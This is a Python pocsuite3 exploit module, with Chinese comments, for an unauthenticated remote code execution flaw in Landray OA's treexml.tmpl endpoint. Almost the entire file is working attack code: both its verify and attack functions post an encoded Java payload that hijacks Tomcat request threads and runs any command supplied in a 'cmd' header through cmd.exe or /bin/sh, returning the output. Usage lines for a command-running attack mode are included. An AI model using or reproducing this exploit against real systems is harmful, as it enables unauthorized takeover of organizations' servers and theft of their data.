from collections import OrderedDict
from urllib.parse import urljoin
import re,json,random
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY
from requests.packages.urllib3.exceptions import InsecureRequestWarning
# 禁用安全请求警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2022-07-17'  #漏洞公开的时间,不知道就写今天
    createDate = '2022-07-17'  # 编写 PoC 的日期
    updateDate = '2022-07-17'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://github.com/tangxiaofeng7/Landray-OA-Treexml-Rce']  # 漏洞地址来源,0day不用写
    name = '蓝凌OA未授权代码执行漏洞'  # PoC 名称
    appPowerLink = 'www.landray.com.cn'  # 漏洞厂商主页地址
    appName = 'Landray-OA系统'  # 漏洞应用名称
    appVersion = '''未知'''  # 漏洞影响版本
    vulType = VUL_TYPE.CODE_EXECUTION  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        蓝凌OA /data/sys-common/treexml.tmpl 功能页面过滤不当，导致可以执行恶意代码，获取系统权限。
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    利用:pocsuite -r .\poc++.py -u url(-f url.txt) --attack --command id 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    def _options(self):
        o = OrderedDict()
        o["command"] = OptString(default='whoami',description='输入命令',require=False)
        return o
        
    def _verify(self):
        str_num = str(random.randint(1000000000,9999999999))
        cmd = 'echo '+ str_num
        result = {}
        path = "/data/sys-common/treexml.tmpl"
        headers={'User-Agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36',
                 'Content-Type': 'application/x-www-form-urlencoded',
                 'cmd': cmd
                 }
        url = self.url + path
        data = 's_bean=ruleFormulaValidate&script=boolean%20flag%20%3D%20false%3BThreadGroup%20group%20%3D%20Thread.currentThread%28%29.getThreadGroup%28%29%3Bjava.lang.reflect.Field%20f%20%3D%20group.getClass%28%29.getDeclaredField%28%22threads%22%29%3Bf.setAccessible%28true%29%3BThread%5B%5D%20threads%20%3D%20%28Thread%5B%5D%29%20f.get%28group%29%3Bfor%20%28int%20i%20%3D%200%3B%20i%20%3C%20threads.length%3B%20i%2B%2B%29%20%7B%20try%20%7B%20Thread%20t%20%3D%20threads%5Bi%5D%3Bif%20%28t%20%3D%3D%20null%29%20%7B%20continue%3B%20%7DString%20str%20%3D%20t.getName%28%29%3Bif%20%28str.contains%28%22exec%22%29%20%7C%7C%20%21str.contains%28%22http%22%29%29%20%7B%20continue%3B%20%7Df%20%3D%20t.getClass%28%29.getDeclaredField%28%22target%22%29%3Bf.setAccessible%28true%29%3BObject%20obj%20%3D%20f.get%28t%29%3Bif%20%28%21%28obj%20instanceof%20Runnable%29%29%20%7B%20continue%3B%20%7Df%20%3D%20obj.getClass%28%29.getDeclaredField%28%22this%240%22%29%3Bf.setAccessible%28true%29%3Bobj%20%3D%20f.get%28obj%29%3Btry%20%7B%20f%20%3D%20obj.getClass%28%29.getDeclaredField%28%22handler%22%29%3B%20%7D%20catch%20%28NoSuchFieldException%20e%29%20%7B%20f%20%3D%20obj.getClass%28%29.getSuperclass%28%29.getSuperclass%28%29.getDeclaredField%28%22handler%22%29%3B%20%7Df.setAccessible%28true%29%3Bobj%20%3D%20f.get%28obj%29%3Btry%20%7B%20f%20%3D%20obj.getClass%28%29.getSuperclass%28%29.getDeclaredField%28%22global%22%29%3B%20%7Dcatch%20%28NoSuchFieldException%20e%29%20%7B%20f%20%3D%20obj.getClass%28%29.getDeclaredField%28%22global%22%29%3B%20%7Df.setAccessible%28true%29%3Bobj%20%3D%20f.get%28obj%29%3Bf%20%3D%20obj.getClass%28%29.getDeclaredField%28%22processors%22%29%3Bf.setAccessible%28true%29%3Bjava.util.List%20processors%20%3D%20%28java.util.List%29%20%28f.get%28obj%29%29%3Bfor%20%28int%20j%20%3D%200%3B%20j%20%3C%20processors.size%28%29%3B%20%2B%2Bj%29%20%7B%20Object%20processor%20%3D%20processors.get%28j%29%3Bf%20%3D%20processor.getClass%28%29.getDeclaredField%28%22req%22%29%3Bf.setAccessible%28true%29%3BObject%20req%20%3D%20f.get%28processor%29%3BObject%20resp%20%3D%20req.getClass%28%29.getMethod%28%22getResponse%22%2C%20new%20Class%5B0%5D%29.invoke%28req%2C%20new%20Object%5B0%5D%29%3Bstr%20%3D%20%28String%29%20req.getClass%28%29.getMethod%28%22getHeader%22%2C%20new%20Class%5B%5D%7BString.class%7D%29.invoke%28req%2C%20new%20Object%5B%5D%7B%22cmd%22%7D%29%3Bif%20%28str%20%21%3D%20null%20%26%26%20%21str.isEmpty%28%29%29%20%7B%20resp.getClass%28%29.getMethod%28%22setStatus%22%2C%20new%20Class%5B%5D%7Bint.class%7D%29.invoke%28resp%2C%20new%20Object%5B%5D%7Bnew%20Integer%28200%29%7D%29%3BString%5B%5D%20cmds%20%3D%20System.getProperty%28%22os.name%22%29.toLowerCase%28%29.contains%28%22window%22%29%20%3F%20new%20String%5B%5D%7B%22cmd.exe%22%2C%20%22%2Fc%22%2C%20str%7D%20%3A%20new%20String%5B%5D%7B%22%2Fbin%2Fsh%22%2C%20%22-c%22%2C%20str%7D%3BString%20charsetName%20%3D%20System.getProperty%28%22os.name%22%29.toLowerCase%28%29.contains%28%22window%22%29%20%3F%20%22GBK%22%3A%22UTF-8%22%3Bbyte%5B%5D%20text2%20%3D%28new%20java.util.Scanner%28%28new%20ProcessBuilder%28cmds%29%29.start%28%29.getInputStream%28%29%2CcharsetName%29%29.useDelimiter%28%22%5C%5CA%22%29.next%28%29.getBytes%28charsetName%29%3Bbyte%5B%5D%20result%3D%28%22Execute%3A%20%20%20%20%22%2Bnew%20String%28text2%2C%22utf-8%22%29%29.getBytes%28charsetName%29%3Btry%20%7B%20Class%20cls%20%3D%20Class.forName%28%22org.apache.tomcat.util.buf.ByteChunk%22%29%3Bobj%20%3D%20cls.newInstance%28%29%3Bcls.getDeclaredMethod%28%22setBytes%22%2C%20new%20Class%5B%5D%7Bbyte%5B%5D.class%2C%20int.class%2C%20int.class%7D%29.invoke%28obj%2C%20new%20Object%5B%5D%7Bresult%2C%20new%20Integer%280%29%2C%20new%20Integer%28result.length%29%7D%29%3Bresp.getClass%28%29.getMethod%28%22doWrite%22%2C%20new%20Class%5B%5D%7Bcls%7D%29.invoke%28resp%2C%20new%20Object%5B%5D%7Bobj%7D%29%3B%20%7D%20catch%20%28NoSuchMethodException%20var5%29%20%7B%20Class%20cls%20%3D%20Class.forName%28%22java.nio.ByteBuffer%22%29%3Bobj%20%3D%20cls.getDeclaredMethod%28%22wrap%22%2C%20new%20Class%5B%5D%7Bbyte%5B%5D.class%7D%29.invoke%28cls%2C%20new%20Object%5B%5D%7Bresult%7D%29%3Bresp.getClass%28%29.getMethod%28%22doWrite%22%2C%20new%20Class%5B%5D%7Bcls%7D%29.invoke%28resp%2C%20new%20Object%5B%5D%7Bobj%7D%29%3B%20%7Dflag%20%3D%20true%3B%20%7Dif%20%28flag%29%20%7B%20break%3B%20%7D%20%7Dif%20%28flag%29%20%7B%20break%3B%20%7D%20%7D%20catch%20%28Exception%20e%29%20%7B%20continue%3B%20%7D%20%7D'
        try:
            resq = requests.post(url=url,headers=headers,data=data,timeout=5)
            if resq.text and str_num in resq.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Response'] = resq.text
        except Exception as e:
            return
        return self.parse_output(result)

    def _attack(self):
        result = {}
        command = self.get_option("command")
        path = "/data/sys-common/treexml.tmpl"
        headers={'User-Agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36',
                 'Content-Type': 'application/x-www-form-urlencoded',
                 'cmd': command
                 }
        url = self.url + path
        data = 's_bean=ruleFormulaValidate&script=boolean%20flag%20%3D%20false%3BThreadGroup%20group%20%3D%20Thread.currentThread%28%29.getThreadGroup%28%29%3Bjava.lang.reflect.Field%20f%20%3D%20group.getClass%28%29.getDeclaredField%28%22threads%22%29%3Bf.setAccessible%28true%29%3BThread%5B%5D%20threads%20%3D%20%28Thread%5B%5D%29%20f.get%28group%29%3Bfor%20%28int%20i%20%3D%200%3B%20i%20%3C%20threads.length%3B%20i%2B%2B%29%20%7B%20try%20%7B%20Thread%20t%20%3D%20threads%5Bi%5D%3Bif%20%28t%20%3D%3D%20null%29%20%7B%20continue%3B%20%7DString%20str%20%3D%20t.getName%28%29%3Bif%20%28str.contains%28%22exec%22%29%20%7C%7C%20%21str.contains%28%22http%22%29%29%20%7B%20continue%3B%20%7Df%20%3D%20t.getClass%28%29.getDeclaredField%28%22target%22%29%3Bf.setAccessible%28true%29%3BObject%20obj%20%3D%20f.get%28t%29%3Bif%20%28%21%28obj%20instanceof%20Runnable%29%29%20%7B%20continue%3B%20%7Df%20%3D%20obj.getClass%28%29.getDeclaredField%28%22this%240%22%29%3Bf.setAccessible%28true%29%3Bobj%20%3D%20f.get%28obj%29%3Btry%20%7B%20f%20%3D%20obj.getClass%28%29.getDeclaredField%28%22handler%22%29%3B%20%7D%20catch%20%28NoSuchFieldException%20e%29%20%7B%20f%20%3D%20obj.getClass%28%29.getSuperclass%28%29.getSuperclass%28%29.getDeclaredField%28%22handler%22%29%3B%20%7Df.setAccessible%28true%29%3Bobj%20%3D%20f.get%28obj%29%3Btry%20%7B%20f%20%3D%20obj.getClass%28%29.getSuperclass%28%29.getDeclaredField%28%22global%22%29%3B%20%7Dcatch%20%28NoSuchFieldException%20e%29%20%7B%20f%20%3D%20obj.getClass%28%29.getDeclaredField%28%22global%22%29%3B%20%7Df.setAccessible%28true%29%3Bobj%20%3D%20f.get%28obj%29%3Bf%20%3D%20obj.getClass%28%29.getDeclaredField%28%22processors%22%29%3Bf.setAccessible%28true%29%3Bjava.util.List%20processors%20%3D%20%28java.util.List%29%20%28f.get%28obj%29%29%3Bfor%20%28int%20j%20%3D%200%3B%20j%20%3C%20processors.size%28%29%3B%20%2B%2Bj%29%20%7B%20Object%20processor%20%3D%20processors.get%28j%29%3Bf%20%3D%20processor.getClass%28%29.getDeclaredField%28%22req%22%29%3Bf.setAccessible%28true%29%3BObject%20req%20%3D%20f.get%28processor%29%3BObject%20resp%20%3D%20req.getClass%28%29.getMethod%28%22getResponse%22%2C%20new%20Class%5B0%5D%29.invoke%28req%2C%20new%20Object%5B0%5D%29%3Bstr%20%3D%20%28String%29%20req.getClass%28%29.getMethod%28%22getHeader%22%2C%20new%20Class%5B%5D%7BString.class%7D%29.invoke%28req%2C%20new%20Object%5B%5D%7B%22cmd%22%7D%29%3Bif%20%28str%20%21%3D%20null%20%26%26%20%21str.isEmpty%28%29%29%20%7B%20resp.getClass%28%29.getMethod%28%22setStatus%22%2C%20new%20Class%5B%5D%7Bint.class%7D%29.invoke%28resp%2C%20new%20Object%5B%5D%7Bnew%20Integer%28200%29%7D%29%3BString%5B%5D%20cmds%20%3D%20System.getProperty%28%22os.name%22%29.toLowerCase%28%29.contains%28%22window%22%29%20%3F%20new%20String%5B%5D%7B%22cmd.exe%22%2C%20%22%2Fc%22%2C%20str%7D%20%3A%20new%20String%5B%5D%7B%22%2Fbin%2Fsh%22%2C%20%22-c%22%2C%20str%7D%3BString%20charsetName%20%3D%20System.getProperty%28%22os.name%22%29.toLowerCase%28%29.contains%28%22window%22%29%20%3F%20%22GBK%22%3A%22UTF-8%22%3Bbyte%5B%5D%20text2%20%3D%28new%20java.util.Scanner%28%28new%20ProcessBuilder%28cmds%29%29.start%28%29.getInputStream%28%29%2CcharsetName%29%29.useDelimiter%28%22%5C%5CA%22%29.next%28%29.getBytes%28charsetName%29%3Bbyte%5B%5D%20result%3D%28%22Execute%3A%20%20%20%20%22%2Bnew%20String%28text2%2C%22utf-8%22%29%29.getBytes%28charsetName%29%3Btry%20%7B%20Class%20cls%20%3D%20Class.forName%28%22org.apache.tomcat.util.buf.ByteChunk%22%29%3Bobj%20%3D%20cls.newInstance%28%29%3Bcls.getDeclaredMethod%28%22setBytes%22%2C%20new%20Class%5B%5D%7Bbyte%5B%5D.class%2C%20int.class%2C%20int.class%7D%29.invoke%28obj%2C%20new%20Object%5B%5D%7Bresult%2C%20new%20Integer%280%29%2C%20new%20Integer%28result.length%29%7D%29%3Bresp.getClass%28%29.getMethod%28%22doWrite%22%2C%20new%20Class%5B%5D%7Bcls%7D%29.invoke%28resp%2C%20new%20Object%5B%5D%7Bobj%7D%29%3B%20%7D%20catch%20%28NoSuchMethodException%20var5%29%20%7B%20Class%20cls%20%3D%20Class.forName%28%22java.nio.ByteBuffer%22%29%3Bobj%20%3D%20cls.getDeclaredMethod%28%22wrap%22%2C%20new%20Class%5B%5D%7Bbyte%5B%5D.class%7D%29.invoke%28cls%2C%20new%20Object%5B%5D%7Bresult%7D%29%3Bresp.getClass%28%29.getMethod%28%22doWrite%22%2C%20new%20Class%5B%5D%7Bcls%7D%29.invoke%28resp%2C%20new%20Object%5B%5D%7Bobj%7D%29%3B%20%7Dflag%20%3D%20true%3B%20%7Dif%20%28flag%29%20%7B%20break%3B%20%7D%20%7Dif%20%28flag%29%20%7B%20break%3B%20%7D%20%7D%20catch%20%28Exception%20e%29%20%7B%20continue%3B%20%7D%20%7D'
        try:
            resq = requests.post(url=url,headers=headers,data=data,timeout=5)
            response = re.search('[\s]+[\S\s]+?(?=<RestResponse>)',resq.text).group()
            if resq.text :
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Response'] = response
        except Exception as e:
            return
        return self.parse_output(result)
    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
register_poc(POC)
